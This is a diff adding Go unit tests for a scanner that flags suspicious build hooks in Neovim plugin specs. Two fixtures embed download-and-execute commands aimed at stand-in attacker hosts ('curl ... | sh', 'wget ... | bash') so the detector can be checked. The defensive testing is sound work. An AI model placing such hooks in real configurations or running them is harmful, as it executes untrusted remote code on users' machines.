@@ -131,6 +131,34 @@ func TestRawIPLiteral_NoMatch_Domain(t *testing.T) {
 	noCap(t, `local url = "https://example.com/api"`, domain.CapRawIPLiteral)
 }
 
+func TestBuildHook_CurlPipeSh_Flagged(t *testing.T) {
+	// Plugin spec with a dangerous build string — should flag suspicious.
+	hasCap(t, `
+return {
+  { "evil/payload", build = "curl https://attacker.tld/x.sh | sh" },
+}
+`, domain.CapInstallHookSuspicious)
+}
+
+func TestBuildHook_WgetPipeBash_Flagged(t *testing.T) {
+	hasCap(t, `
+require("lazy").setup({
+  { "evil/payload", build = "wget -q http://x.tld/y.sh | bash" },
+})
+`, domain.CapInstallHookSuspicious)
+}
+
+func TestBuildHook_Benign_NotFlagged(t *testing.T) {
+	// Standard plugin spec — `:TSUpdate` is a Neovim cmd, not shell.
+	// `npm install` is plain package management, not a download-exec.
+	noCap(t, `
+return {
+  { "nvim-treesitter/nvim-treesitter", build = ":TSUpdate" },
+  { "MunifTanjim/prettier.nvim", build = "npm install --frozen-lockfile" },
+}
+`, domain.CapInstallHookSuspicious)
+}
+
 func TestCleanFile_NoCaps(t *testing.T) {
 	got := caps(t, `
 local M = {}
